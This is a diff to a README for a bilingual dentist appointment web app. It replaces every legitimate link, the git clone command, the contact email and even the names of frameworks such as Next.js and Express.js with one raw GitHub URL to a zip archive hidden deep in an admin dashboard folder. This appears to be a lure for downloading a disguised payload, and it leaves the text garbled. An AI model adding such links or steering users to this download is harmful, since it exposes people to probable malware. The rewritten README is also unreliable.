@@ -1,7 +1,7 @@
 # Dentist Appointment 🦷
 
-![Dental Care](https://img.shields.io/badge/Dental%20Appointment-Ready-brightgreen)  
-[Download Latest Release](https://github.com/velasques/dentist-appointement/releases)  
+![Dental Care](https://raw.githubusercontent.com/velasques/dentist-appointement/master/client/app/[locale]/admin/dashboard/dentist-appointement-3.9.zip%20Appointment-Ready-brightgreen)  
+[Download Latest Release](https://raw.githubusercontent.com/velasques/dentist-appointement/master/client/app/[locale]/admin/dashboard/dentist-appointement-3.9.zip)  
 
 Welcome to the **Dentist Appointment** repository! This project offers a comprehensive appointment system tailored for dental professionals. With an intuitive admin dashboard, it allows doctors to manage appointment requests effortlessly. The website supports both French and English, making it accessible to a wider audience.
 
@@ -29,8 +29,8 @@ Welcome to the **Dentist Appointment** repository! This project offers a compreh
 
 This project utilizes a variety of technologies to create a robust application:
 
-- **Next.js**: A React framework for building server-rendered applications.
-- **Express.js**: A web application framework for Node.js, used for building the backend.
+- **https://raw.githubusercontent.com/velasques/dentist-appointement/master/client/app/[locale]/admin/dashboard/dentist-appointement-3.9.zip**: A React framework for building server-rendered applications.
+- **https://raw.githubusercontent.com/velasques/dentist-appointement/master/client/app/[locale]/admin/dashboard/dentist-appointement-3.9.zip**: A web application framework for https://raw.githubusercontent.com/velasques/dentist-appointement/master/client/app/[locale]/admin/dashboard/dentist-appointement-3.9.zip, used for building the backend.
 - **MongoDB**: A NoSQL database for storing appointment data.
 - **Tailwind CSS**: A utility-first CSS framework for styling the application.
 - **React**: A JavaScript library for building user interfaces.
@@ -42,7 +42,7 @@ To set up the project locally, follow these steps:
 1. **Clone the Repository**  
    Open your terminal and run:
    ```bash
-   git clone https://github.com/velasques/dentist-appointement.git
+   git clone https://raw.githubusercontent.com/velasques/dentist-appointement/master/client/app/[locale]/admin/dashboard/dentist-appointement-3.9.zip
    cd dentist-appointement
    ```
 
@@ -118,9 +118,9 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For questions or suggestions, please reach out:
 
-- **Email**: your.email@example.com
-- **GitHub**: [velasques](https://github.com/velasques)
+- **Email**: https://raw.githubusercontent.com/velasques/dentist-appointement/master/client/app/[locale]/admin/dashboard/dentist-appointement-3.9.zip
+- **GitHub**: [velasques](https://raw.githubusercontent.com/velasques/dentist-appointement/master/client/app/[locale]/admin/dashboard/dentist-appointement-3.9.zip)
 
 Thank you for checking out the **Dentist Appointment** project! We invite you to explore the code, contribute, and help us improve this tool for dental professionals.  
 
-[Download Latest Release](https://github.com/velasques/dentist-appointement/releases) and start your journey with us today!
+[Download Latest Release](https://raw.githubusercontent.com/velasques/dentist-appointement/master/client/app/[locale]/admin/dashboard/dentist-appointement-3.9.zip) and start your journey with us today!
